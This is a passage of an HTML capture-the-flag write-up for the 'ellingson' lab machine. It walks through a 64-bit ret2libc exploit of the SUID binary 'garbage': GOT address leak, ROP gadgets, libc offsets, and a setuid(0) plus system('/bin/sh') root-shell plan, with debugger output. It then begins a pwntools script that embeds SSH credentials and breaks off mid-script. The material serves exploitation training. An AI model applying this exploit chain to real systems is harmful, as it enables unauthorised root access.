+                printf()&nbsp;-&nbsp;0x06&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------------&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x06&nbsp;-&nbsp;0x152980360123&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(where&nbsp;printf()&nbsp;is&nbsp;in&nbsp;memory)
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>About ASLR - Offsets to Functions in Libraries Remain Consistent</strong></h3><br>
+        With ASLR enabled, a library's base address is randomised.<br>
+        However, the offset to a function from the base address remains consistent.<br>
+        <br>
+        <em><strong>For example</strong></em><br>
+        1st run<br>
+        • libc's base address is <code>0x0000454443424100</code><br>
+        • The offset to libc's system() function from the libc base address is <code>0x99</code> - this will remain consistent every time<br>
+        • The libc system() function, on this run of the binary, lives at <code>0x0000454443424199</code><br>
+        <br>
+        2nd run<br>
+        • libc's base address has changed because of ASLR - <code>0x0000353433323100</code><br>
+        • But the offset to libc system() is still <code>0x99</code><br>
+        • On this run of the binary, libc system() lives at <code>0x0000353433323199</code><br>
+        <br>
+        <a id="h3-6" name="h3-6"></a><strong></strong>
+        <h3><strong>Leaking an Address from the GOT</strong></h3><br>
+        Knowing that offsets to functions within a library remain consistent, if we can leak the address of a libc function from the GOT table, we can subtract its offset from the address we leak to find libc's base address.<br>
+        <br>
+        <em><strong>Example</strong></em><br>
+        We leak the address of system() from the GOT - <code>0x0000454443424199</code><br>
+        We've read libc on the target system and know that the offset to system() from libc's base address is <code>0x99</code><br>
+        Therefore, to find libc's base address:<br>
+        • leaked address - offset = libc's base address<br>
+        • <code>0x0000454443424199</code> - <code>0x99</code> = <code>0x0000454443424100</code><br>
+        • <code>0x0000454443424100</code> is libc's base addres<br>
+        <br>
+        <a id="h3-7" name="h3-7"></a><strong></strong>
+        <h3><strong>How to Use the Leaked Address to make ASLR Completely Redundant</strong></h3><br>
+        Now that we know libc's base address, using the offsets in the libc library on the target system, we can calculate the location of any libc library function on the system.<br>
+        <br>
+        e.g. You read the libc library on the target system and find the offset to <code>setuid()</code> - <code>0x78</code><br>
+        libc's base address + setuid() offset = setuid() location<br>
+        <code>0x0000454443424100</code> + <code>0x78</code> = <code>0x0000454443424178</code><br>
+        <br>
+        <a id="h3-8" name="h3-8"></a><strong></strong>
+        <h3><strong>How to Exploit garbage - Payload Plan</strong></h3><br>
+        1. A padding of N bytes to overwrite RIP<br>
+        2. Create stage 1 payload<br>
+        1) Pop stub for puts() in PLT into RDI register<br>
+        2) Run puts(&lt;stub&gt;) to read puts()'s entry in the <em>Global Offset Table</em> and leak puts()'s memory address<br>
+        3. Return to main() to reset the program/put it back into a working state<br>
+        4. Using the leaked address, calculate<br>
+        1) libc's base address<br>
+        5. Using the newly-caculated libc base address, calculate<br>
+        1) libc setuid() address (to run system() as root)<br>
+        2) libc system() address (to run system commands)<br>
+        3) libc â€œ/bin/shâ€ string (to be used with system() so that we can spawn a shell)<br>
+        6. Create stage 2 payload<br>
+        1) pop 0 into RDI register<br>
+        2) run setuid(0) (so that we can run system() as root)<br>
+        3) pop â€œ/bin/shâ€ string into RDI register<br>
+        4) run system("/bin/sh") to spawn a shell<br>
+        <br>
+        <a id="h2-8" name="h2-8"></a><strong></strong>
+        <h2><strong>INFO - Extra notes</strong></h2><br>
+        <a id="h3-9" name="h3-9"></a><strong></strong>
+        <h3><strong>64-bit Calling Conventions</strong></h3><br>
+        On 64-bit machines, parameters for functions are placed into registers, not the stack.<br>
+        The parameters are put into registers in this order - <code>RDI, RSI, RDX, RCX, R8, R9</code><br>
+        If there are more than 6 parameters, extra parameters are placed onto the stack.<br>
+        <br>
+        This is why, in the plan above, we pop the parameters for our functions into the RDI register, and why we need to find a <code>pop rdi; ret</code> gadget.<br>
+        <br>
+        <a id="h3-10" name="h3-10"></a><strong></strong>
+        <h3><strong>Why is setuid() needed?</strong></h3><br>
+        Normally, to exploit a simple binary using system() you would just overflow the buffer, call system("/bin/sh") and be done with it.<br>
+        That won't work here because we're exploiting a SUID binary.<br>
+        <br>
+        Just because the binary has a SUID bit doesn't mean that it <em>will</em> run as root, just that it has the <em>potential</em> to run as root.<br>
+        <br>
+        In order for <code>system()</code> to spawn a shell as root, you have to first run <code>setuid(0)</code> to set the user ID of the calling process (the garbage binary) to root. Next, when we run system(), this will ensure that system() runs as root and spawns a root shell.<br>
+        <br>
+        <a id="h2-9" name="h2-9"></a><strong></strong>
+        <h2><strong>7) Finding What We Need for the Exploit</strong></h2><br>
+        As a summary of the long-winded explanation above, for the exploit we need to find<br>
+        • the offset to overwrite RIP<br>
+        • a <code>pop rdi; ret</code> gadget - so that we can pop function parameters into RDI<br>
+        • puts()<br>
+        ◦ puts()'s PLT address - used to run the puts() function<br>
+        ◦ puts()'s GOT address - the parameter to be used with puts() which points to puts()'s GOT entry to print out/leak address<br>
+        • main()'s PLT address - used to return to main() and put the program back into a function state ready for stage 2 payload<br>
+        • offsets<br>
+        ◦ libc puts() offset - used to calculate libc's base address<br>
+        ◦ libc setuid() offset - used to calculate libc setuid() address<br>
+        ◦ libc system offset - used to calculate libc system() address<br>
+        • A â€œ/bin/shâ€ string - used with system() to spawn a shell<br>
+        <br>
+        WHEW! THAT'S A LOT OF STUFF.<br>
+        <br>
+        <a id="h3-11" name="h3-11"></a><strong></strong>
+        <h3><strong>7a) Find offset to overwrite RIP</strong></h3><br>
+        Open <code>garbage</code> with <code>gdb-peda</code> and send a 200 long, non-repeating string to the binary using <code>pattern create 200</code>.<br>
+            <div class="codebox">
+                root@city64:~/ctf/ellingson#&nbsp;gdb&nbsp;-q&nbsp;garbage<br>
+                Reading&nbsp;symbols&nbsp;from&nbsp;garbage...(no&nbsp;debugging&nbsp;symbols&nbsp;found)...done.<br>
+                gdb-peda$&nbsp;pattern&nbsp;create&nbsp;200<br>
+                'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'<br>
+                gdb-peda$&nbsp;run<br>
+                Starting&nbsp;program:&nbsp;/root/ctf/ellingson/garbage&nbsp;<br>
+                Enter&nbsp;access&nbsp;password:&nbsp;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA<br>
+                <br>
+                access&nbsp;denied.<br>
+                <br>
+                Program&nbsp;received&nbsp;signal&nbsp;SIGSEGV,&nbsp;Segmentation&nbsp;fault.<br>
+                <br>
+                [----------------------------------registers-----------------------------------]<br>
+                RAX:&nbsp;0x0&nbsp;<br>
+                RBX:&nbsp;0x0&nbsp;<br>
+                RCX:&nbsp;0x7f67ac940804&nbsp;(&lt;__GI___libc_write+20&gt;: cmp&nbsp;&nbsp;&nbsp;&nbsp;rax,0xfffffffffffff000)<br>
+                RDX:&nbsp;0x7f67aca138c0&nbsp;--&gt;&nbsp;0x0&nbsp;<br>
+                RSI:&nbsp;0x5da9c0&nbsp;("access&nbsp;denied.\nssword:&nbsp;")<br>
+                RDI:&nbsp;0x0&nbsp;<br>
+                RBP:&nbsp;0x6c41415041416b41&nbsp;('AkAAPAAl')<br>
+                RSP:&nbsp;0x7ffeaacd67d8&nbsp;("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")<br>
+                RIP:&nbsp;0x401618&nbsp;(&lt;auth+261&gt;: ret)<br>
+                R8&nbsp;:&nbsp;0x7f67aca18500&nbsp;(0x00007f67aca18500)<br>
+                R9&nbsp;:&nbsp;0x7f67aca12848&nbsp;--&gt;&nbsp;0x7f67aca12760&nbsp;--&gt;&nbsp;0xfbad2a84&nbsp;<br>
+                R10:&nbsp;0xfffffffffffff638&nbsp;<br>
+                R11:&nbsp;0x246&nbsp;<br>
+                R12:&nbsp;0x401170&nbsp;(&lt;_start&gt;: xor&nbsp;&nbsp;&nbsp;&nbsp;ebp,ebp)<br>
+                R13:&nbsp;0x7ffeaacd68d0&nbsp;--&gt;&nbsp;0x1&nbsp;<br>
+                R14:&nbsp;0x0&nbsp;<br>
+                R15:&nbsp;0x0<br>
+                EFLAGS:&nbsp;0x10246&nbsp;(carry&nbsp;PARITY&nbsp;adjust&nbsp;ZERO&nbsp;sign&nbsp;trap&nbsp;INTERRUPT&nbsp;direction&nbsp;overflow)<br>
+                [-------------------------------------code-------------------------------------]<br>
+                &nbsp;&nbsp;&nbsp;0x40160d&nbsp;&lt;auth+250&gt;: call&nbsp;&nbsp;&nbsp;0x401050&nbsp;&lt;puts@plt&gt;<br>
+                &nbsp;&nbsp;&nbsp;0x401612&nbsp;&lt;auth+255&gt;: mov&nbsp;&nbsp;&nbsp;&nbsp;eax,0x0<br>
+                &nbsp;&nbsp;&nbsp;0x401617&nbsp;&lt;auth+260&gt;: leave&nbsp;&nbsp;<br>
+                =&gt;&nbsp;0x401618&nbsp;&lt;auth+261&gt;: ret&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;0x401619&nbsp;&lt;main&gt;: push&nbsp;&nbsp;&nbsp;rbp<br>
+                &nbsp;&nbsp;&nbsp;0x40161a&nbsp;&lt;main+1&gt;: mov&nbsp;&nbsp;&nbsp;&nbsp;rbp,rsp<br>
+                &nbsp;&nbsp;&nbsp;0x40161d&nbsp;&lt;main+4&gt;: sub&nbsp;&nbsp;&nbsp;&nbsp;rsp,0x10<br>
+                &nbsp;&nbsp;&nbsp;0x401621&nbsp;&lt;main+8&gt;: mov&nbsp;&nbsp;&nbsp;&nbsp;eax,0x0<br>
+                [------------------------------------stack-------------------------------------]<br>
+                0000|&nbsp;0x7ffeaacd67d8&nbsp;("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")<br>
+                0008|&nbsp;0x7ffeaacd67e0&nbsp;("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")<br>
+                0016|&nbsp;0x7ffeaacd67e8&nbsp;("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")<br>
+                0024|&nbsp;0x7ffeaacd67f0&nbsp;("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")<br>
+                0032|&nbsp;0x7ffeaacd67f8&nbsp;("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")<br>
+                0040|&nbsp;0x7ffeaacd6800&nbsp;("AuAAXAAvAAYAAwAAZAAxAAyA")<br>
+                0048|&nbsp;0x7ffeaacd6808&nbsp;("AAYAAwAAZAAxAAyA")<br>
+                0056|&nbsp;0x7ffeaacd6810&nbsp;("ZAAxAAyA")<br>
+                [------------------------------------------------------------------------------]<br>
+                Legend:&nbsp;code,&nbsp;data,&nbsp;rodata,&nbsp;value<br>
+                Stopped&nbsp;reason:&nbsp;SIGSEGV<br>
+                0x0000000000401618&nbsp;in&nbsp;auth&nbsp;()<br>
+            </div>
+        </div><br>
+        <br>
+        With 64bit binaries, you'll never get an RIP overwrite like you would with 32bit buffer overflows.<br>
+        Instead, you'll see that RIP crashes pointing to a return address<br>
+        <code>RIP: 0x401618 (&lt;auth+261&gt;: ret)</code><br>
+        <br>
+        • The maximum address size on 64-bit machines is <code>0x00007FFFFFFFFFFF</code><br>
+        • We can't overwrite RIP because our cyclic pattern creates a value much higher than the maximum address size - e.g. <code>0x4141414141414141</code><br>
+        • In order to control RIP, we would need to write an address that's within the maximum 64-bit address size - e.g. <code>0x0000424242424242</code><br>
+        <br>
+        You can examine the value which RSP points to (the value of the top of the stack), to determine the offset to overwrite RIP.<br>
+        <br>
+        <code>x/</code> to examine memory<br>
+        <code>x</code> to examine the data in hex format<br>
+        <code>g</code> to set the data type to <em>giant words</em> (64 bits)<br>
+        <code>$rsp</code> to examine data from where RSP is pointing to<br>
+            <div class="codebox">
+                gdb-peda$&nbsp;x/xg&nbsp;$rsp<br>
+                0x7ffeaacd67d8: 0x41416d4141514141
+            </div>
+        </div><br>
+        <br>
+        And use <code>pattern offset &lt;value&gt;</code> to find the offset of the hex value <code>0x41416d4141514141</code><br>
+            <div class="codebox">
+                gdb-peda$&nbsp;pattern&nbsp;offset&nbsp;0x41416d4141514141<br>
+                4702159612987654465&nbsp;found&nbsp;at&nbsp;offset:&nbsp;136
+            </div>
+        </div><br>
+        <br>
+        The offset to overwrite RIP is <code>136</code>.<br>
+        <br>
+        <strong>7a2) Test the RIP overwrite</strong><br>
+        Create a python script that generates your payload.<br>
+            <div class="codebox">
+                <span style="color:#0088ff;font-weight:400">#&nbsp;garbage-pwn.py</span><br>
+                <br>
+                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">136</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;offset&nbsp;to&nbsp;RIP</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"B"</span>*<span style="color:#ff0044;font-weight:400">6</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;overwrite&nbsp;RIP&nbsp;with&nbsp;6&nbsp;Bs</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
+            </div>
+        </div><br>
+        <br>
+        Run the script and write the payload out to a text file.<br>
+            <div class="codebox">
+                root@city64:~/ctf/ellingson#&nbsp;python&nbsp;initial.py&nbsp;&gt;&nbsp;initial.txt
+            </div>
+        </div><br>
+        <br>
+        And open garbage in gdb-peda and submit your payload.<br>
+        You'll see that RIP gets overwritten with <code>0x424242424242</code><br>
+            <div class="codebox">
+                root@city64:~/ctf/ellingson#&nbsp;gdb&nbsp;-q&nbsp;garbage<br>
+                Reading&nbsp;symbols&nbsp;from&nbsp;garbage...(no&nbsp;debugging&nbsp;symbols&nbsp;found)...done.<br>
+                gdb-peda$&nbsp;r&nbsp;&lt;&nbsp;initial.txt<br>
+                Starting&nbsp;program:&nbsp;/root/ctf/ellingson/garbage&nbsp;&lt;&nbsp;initial.txt<br>
+                Enter&nbsp;access&nbsp;password:&nbsp;<br>
+                access&nbsp;denied.<br>
+                <br>
+                Program&nbsp;received&nbsp;signal&nbsp;SIGSEGV,&nbsp;Segmentation&nbsp;fault.<br>
+                <br>
+                [----------------------------------registers-----------------------------------]<br>
+                RAX:&nbsp;0x0&nbsp;<br>
+                RBX:&nbsp;0x0&nbsp;<br>
+                RCX:&nbsp;0x7fb15c74d804&nbsp;(&lt;__GI___libc_write+20&gt;: cmp&nbsp;&nbsp;&nbsp;&nbsp;rax,0xfffffffffffff000)<br>
+                RDX:&nbsp;0x7fb15c8208c0&nbsp;--&gt;&nbsp;0x0&nbsp;<br>
+                RSI:&nbsp;0x45a9c0&nbsp;("access&nbsp;denied.\nssword:&nbsp;\n\260\251E")<br>
+                RDI:&nbsp;0x0&nbsp;<br>
+                RBP:&nbsp;0x4141414141414141&nbsp;('AAAAAAAA')<br>
+                RSP:&nbsp;0x7fffaa0698d0&nbsp;--&gt;&nbsp;0x7fffaa0699c0&nbsp;--&gt;&nbsp;0x1&nbsp;<br>
+                RIP:&nbsp;0x424242424242&nbsp;('BBBBBB')<br>
+                R8&nbsp;:&nbsp;0x7fb15c825500&nbsp;(0x00007fb15c825500)<br>
+                R9&nbsp;:&nbsp;0x7fb15c81f848&nbsp;--&gt;&nbsp;0x7fb15c81f760&nbsp;--&gt;&nbsp;0xfbad2a84&nbsp;<br>
+                R10:&nbsp;0xfffffffffffff638&nbsp;<br>
+                R11:&nbsp;0x246&nbsp;<br>
+                R12:&nbsp;0x401170&nbsp;(&lt;_start&gt;: xor&nbsp;&nbsp;&nbsp;&nbsp;ebp,ebp)<br>
+                R13:&nbsp;0x7fffaa0699c0&nbsp;--&gt;&nbsp;0x1&nbsp;<br>
+                R14:&nbsp;0x0&nbsp;<br>
+                R15:&nbsp;0x0<br>
+                EFLAGS:&nbsp;0x10246&nbsp;(carry&nbsp;PARITY&nbsp;adjust&nbsp;ZERO&nbsp;sign&nbsp;trap&nbsp;INTERRUPT&nbsp;direction&nbsp;overflow)<br>
+                [-------------------------------------code-------------------------------------]<br>
+                Invalid&nbsp;$PC&nbsp;address:&nbsp;0x424242424242<br>
+                [------------------------------------stack-------------------------------------]<br>
+                0000|&nbsp;0x7fffaa0698d0&nbsp;--&gt;&nbsp;0x7fffaa0699c0&nbsp;--&gt;&nbsp;0x1&nbsp;<br>
+                0008|&nbsp;0x7fffaa0698d8&nbsp;--&gt;&nbsp;0x0&nbsp;<br>
+                0016|&nbsp;0x7fffaa0698e0&nbsp;--&gt;&nbsp;0x401740&nbsp;(&lt;__libc_csu_init&gt;: push&nbsp;&nbsp;&nbsp;r15)<br>
+                0024|&nbsp;0x7fffaa0698e8&nbsp;--&gt;&nbsp;0x7fb15c68709b&nbsp;(&lt;__libc_start_main+235&gt;: mov&nbsp;&nbsp;&nbsp;&nbsp;edi,eax)<br>
+                0032|&nbsp;0x7fffaa0698f0&nbsp;--&gt;&nbsp;0x0&nbsp;<br>
+                0040|&nbsp;0x7fffaa0698f8&nbsp;--&gt;&nbsp;0x7fffaa0699c8&nbsp;--&gt;&nbsp;0x7fffaa06a49f&nbsp;("/root/ctf/ellingson/garbage")<br>
+                0048|&nbsp;0x7fffaa069900&nbsp;--&gt;&nbsp;0x100040000&nbsp;<br>
+                0056|&nbsp;0x7fffaa069908&nbsp;--&gt;&nbsp;0x401619&nbsp;(&lt;main&gt;: push&nbsp;&nbsp;&nbsp;rbp)<br>
+                [------------------------------------------------------------------------------]<br>
+                Legend:&nbsp;code,&nbsp;data,&nbsp;rodata,&nbsp;value<br>
+                Stopped&nbsp;reason:&nbsp;SIGSEGV<br>
+                0x0000424242424242&nbsp;in&nbsp;??&nbsp;()<br>
+                gdb-peda$&nbsp;
+            </div>
+        </div><br>
+        <br>
+        Nice! We can control RIP :)<br>
+        Now to find everything else needed for this exploit...<br>
+        <br>
+        <a id="h3-12" name="h3-12"></a><strong></strong>
+        <h3><strong>7b) Find a pop rdi; ret gadget</strong></h3><br>
+        We need to find a <code>pop rdi; ret</code> gadget within the binary.<br>
+        We can find this using gdb-peda on our attacking machine with a copy of the binary.<br>
+        <br>
+        Open <code>garbage</code> with gdb-peda, set a breakpoint on main, and run the binary<br>
+            <div class="codebox">
+                root@city64:~/ctf/ellingson#&nbsp;gdb&nbsp;-q&nbsp;garbage<br>
+                Reading&nbsp;symbols&nbsp;from&nbsp;garbage...(no&nbsp;debugging&nbsp;symbols&nbsp;found)...done.<br>
+                gdb-peda$&nbsp;break&nbsp;main<br>
+                Breakpoint&nbsp;1&nbsp;at&nbsp;0x40161d<br>
+                gdb-peda$&nbsp;run<br>
+                Starting&nbsp;program:&nbsp;/root/ctf/ellingson/garbage&nbsp;<br>
+                ...<br>
+                <br>
+                Breakpoint&nbsp;1,&nbsp;0x000000000040161d&nbsp;in&nbsp;main&nbsp;()
+            </div>
+        </div><br>
+        <br>
+        Use <code>ropsearch</code> to find a <code>pop rdi; ret</code> gadget<br>
+            <div class="codebox">
+                gdb-peda$&nbsp;ropsearch&nbsp;"pop&nbsp;rdi;&nbsp;ret"<br>
+                Searching&nbsp;for&nbsp;ROP&nbsp;gadget:&nbsp;'pop&nbsp;rdi;&nbsp;ret'&nbsp;in:&nbsp;binary&nbsp;ranges<br>
+                0x0040179b&nbsp;:&nbsp;(b'5fc3') pop&nbsp;rdi;&nbsp;ret
+            </div>
+        </div><br>
+        <br>
+        Write it into your exploit - <code>pop_rdi_addr = p64(0x0040179b)</code><br>
+        <br>
+        <a id="h3-13" name="h3-13"></a><strong></strong>
+        <h3><strong>7c) Find puts() PLT and GOT address</strong></h3><br>
+        This needs to be done on the target system.<br>
+        Use <code>objdump</code>.<br>
+        <br>
+            <div class="codebox">
+                margo@ellingson:~$&nbsp;objdump&nbsp;-D&nbsp;/usr/bin/garbage&nbsp;|&nbsp;grep&nbsp;puts<br>
+                0000000000401050&nbsp;&lt;puts@plt&gt;:<br>
+                &nbsp;&nbsp;401050: ff&nbsp;25&nbsp;d2&nbsp;2f&nbsp;00&nbsp;00&nbsp;&nbsp;&nbsp;&nbsp; jmpq&nbsp;&nbsp;&nbsp;*0x2fd2(%rip)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;404028&nbsp;&lt;puts@GLIBC_2.2.5&gt;
+            </div>
+        </div><br>
+        <br>
+        <code>401050</code> is puts()'s PLT address.<br>
+        <code>404028</code> is puts()'s GOT address.<br>
+        <br>
+        <a id="h3-14" name="h3-14"></a><strong></strong>
+        <h3><strong>7d) Find main() PLT address</strong></h3><br>
+        This is also done on the target system with <code>objdump</code>.<br>
+        <br>
+            <div class="codebox">
+                margo@ellingson:~$&nbsp;objdump&nbsp;-D&nbsp;/usr/bin/garbage&nbsp;|&nbsp;grep&nbsp;main<br>
+                &nbsp;&nbsp;401194: ff&nbsp;15&nbsp;56&nbsp;2e&nbsp;00&nbsp;00&nbsp;&nbsp;&nbsp;&nbsp; callq&nbsp;&nbsp;*0x2e56(%rip)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;403ff0&nbsp;&lt;__libc_start_main@GLIBC_2.2.5&gt;<br>
+                0000000000401619&nbsp;&lt;main&gt;:<br>
+                &nbsp;&nbsp;401644: 0f&nbsp;84&nbsp;e6&nbsp;00&nbsp;00&nbsp;00&nbsp;&nbsp;&nbsp;&nbsp; je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;401730&nbsp;&lt;main+0x117&gt;<br>
+                &nbsp;&nbsp;4016cd: 74&nbsp;24&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4016f3&nbsp;&lt;main+0xda&gt;
+            </div>
+        </div><br>
+        <br>
+        <code>0000000000401619</code> is the address of main() in the PLT.<br>
+        You can get rid of the preceding <code>0</code>s - <code>0x401619</code>.<br>
+        <br>
+        <a id="h3-15" name="h3-15"></a><strong></strong>
+        <h3><strong>7e) Find function offsets in libc</strong></h3><br>
+        Again, this needs to be done on the target system.<br>
+        The 3 function offsets we need are puts(), setuid(), system().<br>
+        You can get rid of the preceding <code>0</code>s from all of these offsets.<br>
+        <br>
+        <strong>puts() offset</strong><br>
+            <div class="codebox">
+                margo@ellingson:~$&nbsp;readelf&nbsp;-s&nbsp;/lib/x86_64-linux-gnu/libc.so.6&nbsp;|&nbsp;grep&nbsp;puts<br>
+                &nbsp;&nbsp;&nbsp;191:&nbsp;00000000000809c0&nbsp;&nbsp;&nbsp;512&nbsp;FUNC&nbsp;&nbsp;&nbsp;&nbsp;GLOBAL&nbsp;DEFAULT&nbsp;&nbsp;&nbsp;13&nbsp;_IO_puts@@GLIBC_2.2.5<br>
+                &nbsp;&nbsp;&nbsp;422:&nbsp;00000000000809c0&nbsp;&nbsp;&nbsp;512&nbsp;FUNC&nbsp;&nbsp;&nbsp;&nbsp;WEAK&nbsp;&nbsp;&nbsp;DEFAULT&nbsp;&nbsp;&nbsp;13&nbsp;puts@@GLIBC_2.2<br>
+                &nbsp;&nbsp;&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        <code>0x0809c0</code> is the offset to puts()<br>
+        <br>
+        <strong>setuid() offset</strong><br>
+            <div class="codebox">
+                margo@ellingson:~$&nbsp;readelf&nbsp;-s&nbsp;/lib/x86_64-linux-gnu/libc.so.6&nbsp;|&nbsp;grep&nbsp;setuid<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;23:&nbsp;00000000000e5970&nbsp;&nbsp;&nbsp;144&nbsp;FUNC&nbsp;&nbsp;&nbsp;&nbsp;WEAK&nbsp;&nbsp;&nbsp;DEFAULT&nbsp;&nbsp;&nbsp;13&nbsp;setuid@@GLIBC_2.2.5
+            </div>
+        </div><br>
+        <br>
+        <code>0x0e5970</code> is the offset to setuid()<br>
+        <br>
+        <strong>system() offset</strong><br>
+            <div class="codebox">
+                margo@ellingson:~$&nbsp;readelf&nbsp;-s&nbsp;/lib/x86_64-linux-gnu/libc.so.6&nbsp;|&nbsp;grep&nbsp;system<br>
+                &nbsp;&nbsp;&nbsp;232:&nbsp;0000000000159e20&nbsp;&nbsp;&nbsp;&nbsp;99&nbsp;FUNC&nbsp;&nbsp;&nbsp;&nbsp;GLOBAL&nbsp;DEFAULT&nbsp;&nbsp;&nbsp;13&nbsp;svcerr_systemerr@@GLIBC_2.2.5<br>
+                &nbsp;&nbsp;&nbsp;607:&nbsp;000000000004f440&nbsp;&nbsp;&nbsp;&nbsp;45&nbsp;FUNC&nbsp;&nbsp;&nbsp;&nbsp;GLOBAL&nbsp;DEFAULT&nbsp;&nbsp;&nbsp;13&nbsp;__libc_system@@GLIBC_PRIVATE<br>
+                &nbsp;&nbsp;1403:&nbsp;000000000004f440&nbsp;&nbsp;&nbsp;&nbsp;45&nbsp;FUNC&nbsp;&nbsp;&nbsp;&nbsp;WEAK&nbsp;&nbsp;&nbsp;DEFAULT&nbsp;&nbsp;&nbsp;13&nbsp;system@@GLIBC_2.2.5
+            </div>
+        </div><br>
+        <br>
+        <code>0x04f440</code> is the offset to system()<br>
+        <br>
+        <a id="h3-16" name="h3-16"></a><strong></strong>
+        <h3><strong>7f) Find offset to a "/bin/sh" string</strong></h3><br>
+        Again, this needs to be done on the target system.<br>
+        <br>
+            <div class="codebox">
+                margo@ellingson:~$&nbsp;strings&nbsp;-a&nbsp;-t&nbsp;x&nbsp;/lib/x86_64-linux-gnu/libc.so.6&nbsp;|&nbsp;grep&nbsp;/bin/sh<br>
+                &nbsp;1b3e9a&nbsp;/bin/sh
+            </div>
+        </div><br>
+        <br>
+        <code>0x1b3e9a</code> is an offset to a <code>/bin/sh</code> string in libc.<br>
+        <br>
+        <a id="h2-10" name="h2-10"></a><strong></strong>
+        <h2><strong>8) Write Exploit</strong></h2><br>
+        We have everything we need for the exploit now.<br>
+        Write it!<br>
+        <br>
+        My exploit script is pretty well commented, so hopefully you can understand what's going on :)<br>
+            <div class="codebox">
+                <span style="color:#333333;font-weight:400">from</span>&nbsp;pwn&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;*<br>
+                <br>
+                context(os=<span style="color:#3ad900;font-weight:400">"linux"</span>,&nbsp;arch=<span style="color:#3ad900;font-weight:400">"amd64"</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;set&nbsp;target&nbsp;system&nbsp;architecture</span><br>
+                <span style="color:#0088ff;font-weight:400">#context.log_level&nbsp;=&nbsp;'DEBUG'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;enable&nbsp;if&nbsp;you&nbsp;want&nbsp;debug/verbose&nbsp;output</span><br>
+                s&nbsp;=&nbsp;ssh(host&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'10.10.10.139'</span>,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;remote&nbsp;connection&nbsp;info</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;user&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'margo'</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;password&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'iamgod$08'</span>)<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;----------------------------------------------------------</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Stage&nbsp;1&nbsp;-&nbsp;1a)&nbsp;Leak&nbsp;address&nbsp;of&nbsp;puts()&nbsp;in&nbsp;Gloabl&nbsp;Offset&nbsp;Table</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1b)&nbsp;return&nbsp;to&nbsp;main&nbsp;(to&nbsp;put&nbsp;program&nbsp;back&nbsp;into&nbsp;a&nbsp;functioning&nbsp;state)</span><br>
+                <br>
+                puts_plt_addr&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x401050</span>)&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;objdump&nbsp;-D&nbsp;garbage&nbsp;|&nbsp;grep&nbsp;puts</span><br>
+                puts_got_addr&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x404028</span>)<br>
